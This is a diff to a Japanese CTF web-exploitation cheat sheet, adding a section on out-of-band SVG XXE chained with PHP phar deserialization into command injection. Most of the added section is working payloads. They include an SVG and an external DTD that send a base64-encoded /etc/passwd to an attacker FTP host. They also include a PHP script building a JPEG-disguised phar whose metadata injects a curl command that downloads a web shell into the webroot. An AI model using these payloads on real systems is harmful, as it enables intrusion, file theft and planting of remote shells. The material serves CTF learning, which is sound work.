@@ -16,9 +16,9 @@
   - [XXE (normal XXE / upload XMLfile)](#xxe-normal-xxe--upload-xmlfile)
   - [XXE (normal XXE / request XMLfile's URL)](#xxe-normal-xxe--request-xmlfiles-url)
   - [XXE (SVG XXE / identify fullpath as /proc/self/cwd/flag.txt)](#xxe-svg-xxe--identify-fullpath-as-procselfcwdflagtxt)
-  - [OOB XXE (create DTDfile into server / DNS SubDomain)](#oob-xxe-create-dtdfile-into-server--dns-subdomain)
   - [sample](#sample)
   - [sample](#sample-1)
+  - [sample](#sample-2)
 - [メモ](#%E3%83%A1%E3%83%A2)
 - [参考](#%E5%8F%82%E8%80%83)
 
@@ -262,10 +262,109 @@ $ curl http://167.71.102.84/index.php -d "content=%3C%21ENTITY+%25+all+%22%3C%21
 ]>
 <data>&send;</data>
 ```
-## sample
+## OOB XXE (SVG XXE / upload PHARfile / PHP Object Injection to OS Command Injection)
+https://jbz.team/midnightsunctfquals2019/Rubenscube   
 - **entrypoint**   
+得られたソースコード内に`loadXML`,`svg`というキーワードがあり、送信を許可されているMIMEタイプが`image/png image/jpeg image/svg+xml`の３つしかない(xml形式で送信できない！)のでSVG XXEとわかる。応答は返されないのでOOB XXEとわかる。   
 - **概要**   
+ソースコードを見るとOOB SVG XXEとわかり、SVGファイルをアップロードすればよいが、flagファイルのフルパスがどこかわからない。ここで、`jpeg`とかも許可されており、`Image`クラスで`__destruct()`で以下を呼び出すのでpharでのPHP Object Injectionが可能！(アップされたpharを保存するフルパスはソースからわかる！)   
+`system()`のなかで`$this->folder`とかを任意の値に変えられるのでOS Command Injectionが可能！   
+```php
+    function create_thumb() {
+        $file_path = $this->folder . $this->file_name . $this->extension;
+        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
+        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
+    }
+
+    function __destruct()
+    {
+        if (!file_exists($this->folder)){
+            mkdir($this->folder);
+        }
+        $file_dst = $this->folder . $this->file_name . $this->extension;
+        move_uploaded_file($this->tmp_name, $file_dst);
+        $this->create_thumb();
+    }
+```
 - **Payload**   
+本来は以下でflagを見ればよいが、今回はフラグのあるフルパスがどうしてもわからないのでRCEする必要がある。これはとりあえず`/etc/passwd`を見れるってかんじ。   
+```txt
+// これをsvgファイルとしてアップロードする
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
+<!ENTITY % sp SYSTEM "http://jbz.team/evil.xml">
+%sp;
+%param1;
+]>
+<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
+      <text x="60" y="15" style="fill:black">PoC for XXE file stealing via SVG rasterization</text>
+      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
+      <flowRoot font-size="15">
+         <flowRegion>
+           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
+         </flowRegion>
+         <flowDiv>
+            <flowPara>&exfil;</flowPara>
+         </flowDiv>
+      </flowRoot>
+</svg>
+
+
+// evil.xml (攻撃者サーバーに用意する)
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://jbz.team/%data;'>">
+```
+以下でアップロードするための`phar`ファイルを作成する。   
+```php
+<?php
+class Image {}
+
+$jpeg_header_size = 
+"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
+"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
+"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
+"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
+"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
+"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
+"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
+"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
+"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
+"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";
+
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->addFromString("test.txt","test");
+$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
+$object = new Image;
+$object->tmp_name = '/etc/passwd';
+$object->folder = '/tmp';
+$object->file_name = 'aaa`curl jbz.team/phpshell.txt > /var/www/html/images/<phpsessid>/a.php`bbb';
+$object->extension = 'txt';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+```
+以下のXXEで上記の`phar`ファイルを読み込ませて、メタデータをunserializeさせてPHP Object Injectionを起こしてRCEする！   
+```txt
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
+<!ENTITY % data SYSTEM "phar://images/<phpsessid>/<phar_file_name>.jpg">
+%data;
+]>
+<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
+      <text x="60" y="15" style="fill:black">PoC for XXE file stealing via SVG rasterization</text>
+      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
+      <flowRoot font-size="15">
+         <flowRegion>
+           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
+         </flowRegion>
+         <flowDiv>
+            <flowPara></flowPara>
+         </flowDiv>
+      </flowRoot>
+</svg>
+```
 ## sample
 - **entrypoint**   
 - **概要**   
